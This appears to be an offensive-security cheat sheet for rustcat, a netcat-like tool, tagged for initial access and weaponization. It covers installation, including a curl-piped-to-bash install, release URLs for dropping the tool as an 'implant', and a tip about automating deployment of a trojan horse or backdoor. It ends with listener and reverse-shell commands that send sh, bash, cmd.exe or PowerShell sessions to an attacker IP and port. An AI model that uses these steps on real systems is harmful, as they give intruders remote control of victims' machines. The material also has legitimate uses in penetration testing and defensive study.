---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - rustcat
---
# Rustcat

## 01 - Setup

### 1.1 - Server

Install it according to your distribution.

```
$ bash <(curl -s https://raw.githubusercontent.com/robiot/rustcat/master/pkg/debian-install.sh)

$ yay -S rustcat

$ emerge net-analyzer/rustcat
```

Universal installation.

```
$ cargo install rustcat
```

### 1.2 - Implant

> [!TIP]
> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access.

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64
```

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-win-x86_64.exe
```

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-aarch64

https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-x86_64
```

## 02 - Usage

Launch a listener on the attacker's machine in all addresses (`0.0.0.0`) with command history and command completion and `SIGINT` (`Ctrl + C`) blocking.

```
> rcat listen -ib <attacker_PORT>

> rcat l -ib <attacker_PORT>
```

### 2.1 - Reverse Shell

```
$ ./rcat c -s </bin/sh | /bin/bash> <attacker_IP> <attacker_PORT>
```

```
C:\> .\rcat.exe c -s <cmd.exe | powershell.exe> <attacker_IP> <attacker_PORT>
```

---
## References

### Source Repositories

- [robiot: `rustcat`](https://github.com/robiot/rustcat)